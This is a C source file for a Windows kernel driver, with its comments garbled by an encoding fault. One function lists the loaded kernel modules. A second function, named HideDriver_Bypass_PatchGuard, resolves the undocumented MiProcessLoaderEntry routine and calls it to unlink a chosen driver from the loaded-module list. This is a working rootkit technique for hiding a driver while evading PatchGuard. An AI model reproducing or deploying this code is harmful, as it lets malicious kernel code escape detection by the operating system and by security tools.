#include "EnumDriver.h"
#include "GetMiProcessLoaderEntry.h"


// ����ģ�����
BOOLEAN EnumDriver(PDRIVER_OBJECT pDriverObject)
{
	// ��PDRIVER_OBJECT��ȡDriverSection����ɻ������ģ������
	PLDR_DATA_TABLE_ENTRY pDriverData = (PLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;
	// ��ʼ����˫������
	PLDR_DATA_TABLE_ENTRY pFirstDriverData = pDriverData;
	do
	{
		if ((0 < pDriverData->BaseDllName.Length) ||
			(0 < pDriverData->FullDllName.Length))
		{
			// ��ʾ
			DbgPrint("BaseDllName=%ws,\tDllBase=0x%p,\tSizeOfImage=0x%X,\tFullDllName=%ws\n",
				pDriverData->BaseDllName.Buffer, pDriverData->DllBase,
				pDriverData->SizeOfImage, pDriverData->FullDllName.Buffer);
		}
		// ��һ��
		pDriverData = (PLDR_DATA_TABLE_ENTRY)pDriverData->InLoadOrderLinks.Flink;

	} while (pFirstDriverData != pDriverData);

	return TRUE;
}


// ����ģ������(Bypass Patch Guard)
BOOLEAN HideDriver_Bypass_PatchGuard(PDRIVER_OBJECT pDriverObject, UNICODE_STRING ustrHideDriverName)
{
	// ��PDRIVER_OBJECT��ȡDriverSection����ɻ������ģ������
	PLDR_DATA_TABLE_ENTRY pDriverData = (PLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;
	typedef_MiProcessLoaderEntry MiProcessLoaderEntry = NULL;

	// ��ȡ MiProcessLoaderEntry ������ַ
	MiProcessLoaderEntry = GetFuncAddr_MiProcessLoaderEntry();
	if (NULL == MiProcessLoaderEntry)
	{
		DbgPrint("GetFuncAddr_MiProcessLoaderEntry Error!");
		return FALSE;
	}
	DbgPrint("MiProcessLoaderEntry=0x%p", MiProcessLoaderEntry);

	// ��ʼ����˫������
	PLDR_DATA_TABLE_ENTRY pFirstDriverData = pDriverData;
	do
	{
		if ((0 < pDriverData->BaseDllName.Length) ||
			(0 < pDriverData->FullDllName.Length))
		{
			// �ж��Ƿ�Ϊ���ص�����ģ��
			if (RtlEqualUnicodeString(&pDriverData->BaseDllName, &ustrHideDriverName, TRUE))
			{
				// ժ������(Bypass Patch Guard)
				MiProcessLoaderEntry((PVOID)pDriverData, FALSE);
				DbgPrint("[Hide Driver]%wZ\n", &pDriverData->BaseDllName);
				break;
			}
		}
		// ��һ��
		pDriverData = (PLDR_DATA_TABLE_ENTRY)pDriverData->InLoadOrderLinks.Flink;

	} while (pFirstDriverData != pDriverData);
	
	return TRUE;
}



